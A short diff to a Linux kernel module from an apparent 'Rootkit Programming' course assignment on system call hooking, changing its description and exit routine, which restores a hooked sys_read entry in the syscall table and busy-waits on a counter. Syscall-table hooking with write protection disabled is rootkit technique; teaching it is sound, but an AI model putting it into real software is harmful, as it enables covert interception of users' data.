@@ -20,7 +20,7 @@
 #include <linux/slab.h>
 
 #define DRIVER_AUTHOR "Rootkit Programming"
-#define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"
+#define DRIVER_DESC   "Assigment 1 - 2 System Call Hooking"
 
 void ** syscall_table = (void * *) sys_call_table_R;
 ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
@@ -74,8 +74,8 @@ static void __exit mod_exit(void)
   syscall_table[__NR_read] = orig_sys_read;
   enable_wp();
   kfree(buffer);
-  while(r_count > 0){
-	printk(KERN_INFO "\n");
+  while(r_count > 0){ //hack to unblock read
+	printk(KERN_INFO "%d\n", r_count);
   }  
 }
 
